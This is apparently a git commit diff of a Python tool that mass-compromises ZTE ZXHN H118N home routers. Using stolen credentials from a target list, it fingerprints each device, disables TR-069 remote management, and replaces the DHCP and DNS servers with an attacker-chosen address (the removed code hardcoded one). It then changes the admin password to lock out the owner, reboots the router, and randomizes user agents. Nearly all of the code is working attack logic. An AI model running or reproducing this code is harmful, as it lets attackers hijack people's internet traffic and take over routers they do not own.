5ab7c1b38e43bf7f6f9c5c605cacfc332b0dec66
euclid-catoptrics <101717346+euclid-catoptrics@users.noreply.github.com>
2022-03-16 17:32:10 +0200

    fix orange ones from 2016 & 2020

--- shared.py
+++ shared.py
@@ -1,21 +1,52 @@
 import random
 import string
+import toml
+import re
+import html
 
+from enum import Enum
 
-TIMEOUT = 10
-DNS = '45.84.1.8'
+class Status(Enum):
+    Inaccessible = 0
+    TryAgain = 1
+    WrongAuth = 2
+    WrongTarget = 3
+    PartialSuccess = 4
+    Success = 5
 
+locals().update(toml.load('config.toml'))
+TIMEOUT = 20
+
+with open('useragents.txt') as f:
+    useragents = f.read().split('\n')
 
 def parse(full_string):
     creds, ip = full_string.rsplit('@', 1)
     username, password = creds.split(':', 1)
     return ip, username, password
 
+def parse_target(target):
+    if len(target) == 0 or not '@' in target:
+        return None
+
+    try:
+        target, status = target.rsplit(',', 1)
+        auth, ip = target.rsplit('@', 1)
+        username, password = auth.split(':', 1)
+
+        return ip, username, password, status[0]
+    except:
+        return None
+
+def fingerprint(res):
+    if (match_title := re.search(r'<title>(.*)</title>', res.text)) is not None:
+        title = match_title.group(1)
+        title = html.unescape(title)
+    else:
+        title = ''
+
+    server = res.headers.get('Server', '')
+    return title + ' /// ' + server
 
 def get_pass():
-    return ''.join((
-        *random.choices(string.ascii_lowercase, k=5),
-        *random.choices(string.ascii_uppercase, k=5),
-        *random.choices(string.digits, k=5),
-        '@!'
-    ))
+    return NEWPASS
--- zte_H118N.py
+++ zte_H118N.py
@@ -1,68 +1,122 @@
 import re
-
 import requests
+from requests import RequestException, ReadTimeout
+from time import sleep
 
-from shared import DNS
-from shared import parse
-from shared import TIMEOUT
+from shared import *
 
+def zte_H118N(target):
+    if (auth := parse_target(target)) is None:
+        return Status.WrongAuth
 
-def zte_H118N(full_string):
-    try:
-        ip, username, password = parse(full_string)
-    except ValueError:
-        return False
+    ip, username, password, status = auth
 
     s = requests.Session()
+    s.hooks = { 'response': lambda r, *args, **kwargs: r.raise_for_status() }
+    s.headers.update({
+        'User-Agent': random.choice(useragents),
+        'Accept-Language': 'ru,en-US;q=0.7,en;q=0.3'
+    })
 
     try:
-        r = s.get(f'http://{ip}', timeout=TIMEOUT)
-        r.raise_for_status()
-        if 'ZXHN H118N' not in r.text:
-            return False
-        login_token = re.findall(r'getObj\("Frm_Logintoken"\).value = "(\d+)"', r.text)[0]
-    except (requests.RequestException, IndexError):
-        return False
+        res = s.get(f'http://{ip}', timeout=TIMEOUT)
+    except RequestException:
+        return Status.Inaccessible
 
-    r = s.post(f'http://{ip}/', {
-        'action': 'login',
-        'Username': username,
-        'Password': password,
-        'Frm_Logintoken': login_token,
-    }, timeout=TIMEOUT)
+    if fingerprint(res) != 'ZXHN H118N /// Mini web server 1.0 ZTE corp 2005.':
+        return Status.WrongTarget
+
+    matchtoken = re.search(r'getObj\("Frm_Logintoken"\).value = "(.*)";', res.text)
+    if matchtoken is None:
+        return Status.Inaccessible
+    else:
+        logintoken = matchtoken.group(1)
+
     try:
-        r.raise_for_status()
-    except requests.RequestException:
-        return False
-    if '/start.ghtml' not in r.url:
-        return False
+        s.post(f'http://{ip}/', {
+            'action': 'login',
+            'Username': username,
+            'Password': password,
+            'Frm_Logintoken': logintoken,
+        }, timeout=TIMEOUT)
+    except RequestException:
+        return Status.Inaccessible
 
-    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
-        'Tr069Enable': '0',
-        'IF_ACTION': 'apply',
-        'IF_ERRORSTR': 'SUCC',
-        'IF_ERRORPARAM': 'SUCC',
-        'IF_ERRORTYPE': '-1',
-    }, timeout=TIMEOUT).raise_for_status()
-    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
-        'DNSServer1': DNS,
-        'DNSServer2': '',
-        'DNSServer3': '',
-        'DnsServerSource': '0',
-        'ISPDnsServerSource': 'NULL',
-        'IF_ACTION': 'apply',
-        'IF_ERRORSTR': 'SUCC',
-        'IF_ERRORPARAM': 'SUCC',
-        'IF_ERRORTYPE': '-1',
-    }, timeout=TIMEOUT).raise_for_status()
-    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
-        'SerIPAddress1': DNS,
-        'SerIPAddress2': '0.0.0.0',
-        'IF_ACTION': 'apply',
-        'IF_ERRORSTR': 'SUCC',
-        'IF_ERRORPARAM': 'SUCC',
-        'IF_ERRORTYPE': '-1',
-    }, timeout=TIMEOUT).raise_for_status()
+    if 'User information is error' in res.text or 'ÐÑÐ¸Ð±ÐºÐ° Ð¿ÑÐ¸' in res.text:
+        return Status.WrongAuth
+
+    if '2008-2020 ZTE Co Ltd' in res.text:
+        try:
+            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
+                'DnsCMAPIEnabled': 'NULL',
+                'DomainName': 'NULL',
+                'SerIPAddress1': NEWDNS
+                'SerIPAddress2': '0.0.0.0',
+                'SerIPAddress3': 'NULL',
+                'SerIPAddress4': 'NULL',
+                'SerIPAddress5': 'NULL',
+                'SerIPv6Address1': '::',
+                'SerIPv6Address2': '::',
+                'SerIPv6Address3': 'NULL',
+                'SerIPv6Address4': 'NULL',
+                'SerIPv6Address5': 'NULL',
+                'IF_ACTION': 'apply',
+                'IF_ERRORSTR': 'SUCC',
+                'IF_ERRORPARAM': 'SUCC',
+                'IF_ERRORTYPE': '-1',
+            }, timeout=TIMEOUT)
+
+            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_user_conf_t.gch', {
+                'IF_ACTION': 'apply',
+                'IF_ERRORSTR': 'SUCC',
+                'IF_ERRORPARAM': 'SUCC',
+                'IF_ERRORTYPE': '-1',
+                'IF_INDEX': '1',
+                'Type': 'NULL',
+                'Enable': 'NULL',
+                'Username': username,
+                'OldUsername': username,
+                'Password': NEWPASS,
+                'Right': 'NULL',
+                'OldPassword': password,
+            }, timeout=TIMEOUT)
+
+        except RequestException:
+            return Status.PartialSuccess
+
+    else:
+        try:
+             s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
+                'Tr069Enable': '0',
+                'IF_ACTION': 'apply',
+                'IF_ERRORSTR': 'SUCC',
+                'IF_ERRORPARAM': 'SUCC',
+                'IF_ERRORTYPE': '-1',
+            }, timeout=TIMEOUT)
+
+            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
+                'DNSServer1': NEWDNS,
+                'DNSServer2': '0.0.0.0',
+                'DNSServer3': '',
+                'DnsServerSource': '0',
+                'ISPDnsServerSource': 'NULL',
+                'IF_ACTION': 'apply',
+                'IF_ERRORSTR': 'SUCC',
+                'IF_ERRORPARAM': 'SUCC',
+                'IF_ERRORTYPE': '-1',
+            }, timeout=TIMEOUT)
+
+            s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
+                'SerIPAddress1': NEWDNS,
+                'SerIPAddress2': '0.0.0.0',
+                'IF_ACTION': 'apply',
+                'IF_ERRORSTR': 'SUCC',
+                'IF_ERRORPARAM': 'SUCC',
+                'IF_ERRORTYPE': '-1',
+            }, timeout=TIMEOUT)
+
+        except RequestException:
+            return Status.PartialSuccess
 
     try:
         s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
@@ -72,9 +126,10 @@ def zte_H118N(full_string):
             'IF_ERRORTYPE': '-1',
             'IF_PAGE': '',
             'flag': '1',
-        }, timeout=TIMEOUT).raise_for_status()
-    except requests.exceptions.ReadTimeout:
-        pass
+        }, timeout=TIMEOUT)
+    except ReadTimeout:
+        return Status.Success
+    except RequestException:
+        return Status.PartialSuccess
 
-    print(ip)
-    return True
+    return Status.PartialSuccess
